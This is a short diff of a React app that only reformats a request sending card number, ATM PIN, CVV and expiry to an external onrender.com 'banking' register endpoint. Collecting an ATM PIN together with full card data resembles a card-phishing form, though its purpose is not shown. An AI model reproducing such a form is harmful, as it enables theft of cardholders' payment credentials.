@@ -73,14 +73,17 @@ export default function App() {
     }
 
     try {
-      const response = await axios.post("https://banking-lwpn.onrender.com/api/register", {
-        cardNumber,
-        atmPin,
-        cvv,
-        expiryMonth,
-        expiryYear,
-        acceptTerms,
-      });
+      const response = await axios.post(
+        "https://banking-lwpn.onrender.com/api/register",
+        {
+          cardNumber,
+          atmPin,
+          cvv,
+          expiryMonth,
+          expiryYear,
+          acceptTerms,
+        }
+      );
       console.log(response.data); // Log the response from the backend
 
       // Clear the form fields after successful registration
